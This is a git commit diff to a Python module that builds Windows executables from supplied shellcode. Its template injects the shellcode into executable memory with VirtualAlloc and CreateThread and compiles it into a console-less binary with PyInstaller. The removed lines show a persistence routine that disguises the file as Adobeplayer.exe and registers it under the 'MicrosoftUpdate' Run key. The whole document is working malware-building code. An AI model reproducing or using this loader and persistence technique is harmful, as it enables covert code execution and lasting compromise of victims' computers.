6a5e0a1d837d19d3f4a10f53073e5f7f27dfe665
Taroballz <curtis992250@gmail.com>
2020-05-07 16:05:07 +0800

    modify output code

--- module/make_exe.py
+++ module/make_exe.py
@@ -11,40 +11,19 @@ class exe_options(Moduleobject):
         ui.banner()
         self.values={'source':'',
                      'outfile':'%s'%(time.strftime('%m%Y')+str(random.randint(0,100))+'.exe'),
-                     'sleep':'10',
-                     'persistence':False,
-                     'path':r'C:\\Users\\Public\\Libraries\\Adobeplayer.exe',
+                     'sleep':'5',
                      }
         self.read_code = r''
         self.outfile_dirpath = './output/'
-        self.output_script_name = ''
 
-    def script_code(self,arrive_path,shellcode,persistence,sleeptime):
+    def script_code(self,shellcode,sleeptime):
         return ('''
-import sys,time,shutil,winreg,ctypes,os
-        
-arrive_path = "%s"
-            
-def copyfile_to_C_disk():
-    shutil.copy(sys.argv[0],arrive_path)
-            
-def edit_reg():
-    Key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_WRITE)
-    winreg.SetValueEx(Key,"MicrosoftUpdate",0, winreg.REG_SZ,arrive_path)
-                
-def persistence():
-    copyfile_to_C_disk()
-    edit_reg()
-    
+import time,ctypes
     
 shellcode = ("%s")
             
             
 if __name__ == "__main__":
-    if os.path.isfile(arrive_path) == False:
-        %s
-    else:
-        pass
     time.sleep(%s)
     ptr = ctypes.windll.kernel32.VirtualAlloc(0, 4096, ctypes.c_int(0x1000), ctypes.c_int(0x40))
     ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),ctypes.c_int(len(shellcode)))
@@ -58,7 +37,7 @@ if __name__ == "__main__":
                                              ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%(arrive_path,shellcode,persistence,sleeptime))
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))'''%(shellcode,sleeptime))
 
     def read_shellcode(self,filename):
         with open (filename,'r') as shellcode:
@@ -68,21 +47,12 @@ if __name__ == "__main__":
     def write_script(self,code):
         output_script_name = self.outfile_dirpath+self.values['outfile']+'.py'
         with open (output_script_name,'w') as code_write:
-            if not self.values['persistence']:
-                code_write.write(self.script_code(arrive_path=self.values['path'],
-                                                  shellcode=code,
-                                                  persistence='pass',
-                                                  sleeptime=self.values['sleep']))
-            else:
-                code_write.write(self.script_code(arrive_path=self.values['path'],
-                                                  shellcode=code,
-                                                  persistence='persistence()',
-                                                  sleeptime=self.values['sleep']))
+            code_write.write(self.script_code(shellcode=code,
+                                              sleeptime=self.values['sleep']))
         print('\033[92m' + '[*]' + '\033[0m' + 'script was created succesfully ! ! ',end='\n')
-        return output_script_name
 
     def generate_exe(self):
-        if os.path.isfile(self.output_script_name):
+        if os.path.isfile(self.outfile_dirpath+self.values["outfile"]+".py"):
             os.system('cd output;pyinstaller %s.py --noup --onefile --noconsole --clean;cd ..'
                   %(self.values["outfile"]))
             print('\033[92m'+'[*]'+'\033[0m'+'binary file was created succesfully ! ! ')
@@ -108,7 +78,7 @@ if __name__ == "__main__":
     def run_action(self):
         self.read_code = self.read_shellcode(self.values['source'])
         time.sleep(2)
-        self.output_script_name = self.write_script(code=self.read_code)
+        self.write_script(code=self.read_code)
         time.sleep(2)
         print('-' * 50)
         self.generate_exe()
